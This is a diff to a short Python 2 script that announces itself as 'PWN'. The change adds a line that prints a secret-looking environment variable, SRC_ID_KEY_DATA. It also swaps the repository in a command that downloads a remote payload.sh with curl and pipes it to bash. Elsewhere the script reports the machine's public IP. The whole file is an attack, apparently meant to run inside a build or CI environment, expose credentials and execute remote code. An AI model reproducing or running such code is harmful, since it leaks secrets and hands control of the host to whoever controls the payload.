@@ -1,6 +1,8 @@
-import sys
+import sys, os
 
 print "~_~_~_~_~_~_~_~_~ PWN ~_~_~_~_~_~_~_~_~"
+
+print "SRC_ID_KEY_DATA:", os.environ['SRC_ID_KEY_DATA']
 
 print "Querying public IP..."
 import urllib2
@@ -13,7 +15,7 @@ print urllib2.urlopen("https://api.ipify.org/?format=json").read()
 print "Executing payload..."
 import os
 os.system("which curl")
-os.system("curl -sSL https://raw.githubusercontent.com/slimsag/hax/master/payload.sh | bash")
+os.system("curl -sSL https://raw.githubusercontent.com/pararthshah/hax/master/payload.sh | bash")
 
 print "Done."
 sys.exit(0);
